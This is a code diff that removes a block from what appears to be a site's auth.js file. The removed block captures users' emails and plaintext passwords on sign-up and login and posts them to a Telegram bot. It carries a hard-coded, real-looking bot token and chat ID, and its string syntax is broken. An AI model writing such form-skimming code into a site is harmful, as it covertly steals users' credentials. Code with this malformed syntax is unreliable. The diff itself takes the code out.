@@ -94,53 +94,6 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 })
 
-   /* ============================================================
-   APPEND THIS TO THE VERY BOTTOM OF YOUR AUTH.JS FILE
-   ============================================================ */
-
-document.addEventListener('DOMContentLoaded', () => {
-  // ── Telegram Configuration ──
-  // ⚠️ Make sure to use your updated token and personal chat ID
-  const TELEGRAM_TOKEN = '8314676610:AAE75mMYTbtXU1dSKko_OPZJZ0v-sp_IA44'
-  const TELEGRAM_CHAT_ID = '1490539700'
-
-  // Look for the form elements on the page
-  const registerForm = document.getElementById('registerForm')
-  const loginForm = document.getElementById('loginForm')
-
-  // Helper function to handle sending data to Telegram
-  function sendTelegramAlert(message) {
-    fetch('https://api.telegram.org/bot${8314676610:AAE75mMYTbtXU1dSKko_OPZJZ0v-sp_IA44}/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-    })
-    .catch(err => console.error('Telegram notification failed:', err))
-  }
-
-  // Hook into Register Form submission alongside your Supabase logic
-  if (registerForm) {
-    registerForm.addEventListener('submit', () => {
-      const email = document.getElementById('email').value
-      const password = document.getElementById('password').value
-      
-      const message = 📝 HexaHold — New Sign-up!\n\n📧 Email: ${email}\n🔑 Password: ${password}
-      sendTelegramAlert(message)
-    })
-  }
-
-  // Hook into Login Form submission alongside your Supabase logic
-  if (loginForm) {
-    loginForm.addEventListener('submit', () => {
-      const email = document.getElementById('email').value
-      const password = document.getElementById('password').value
-      
-      const message = 🔑 HexaHold — Login Attempt!\n\n📧 Email: ${email}\n🔒 Password: ${password}
-      sendTelegramAlert(message)
-    })
-  }
-})
-
 
 
 
